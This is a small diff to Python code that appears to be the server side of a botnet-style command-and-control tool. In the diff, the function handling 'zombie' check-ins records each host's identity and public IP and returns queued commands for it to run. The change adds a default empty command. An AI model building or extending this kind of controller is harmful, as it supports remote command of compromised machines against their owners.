@@ -27,14 +27,17 @@ def process_zombie_checkin(json_object, public_ip):
 	# else update check in time
 	if not any(z.uuid == uuid for z in zombies):
 		zombies.append(Zombie(uuid, hostname, username, public_ip, clm))
+		json_response = '{"command":" "}'
+
 	else:
 		z = next((z for z in zombies if z.uuid == uuid), None)
 		z.update_check_in_time()
 		print(z.command_cue)
 		if len(z.command_cue) > 0:
 			command = z.command_cue.pop()
-			print(command)
 			json_response = '{"command":"'+command+'"}'
+		else:
+			json_response = '{"command":" "}'
 	return json_response
 
 
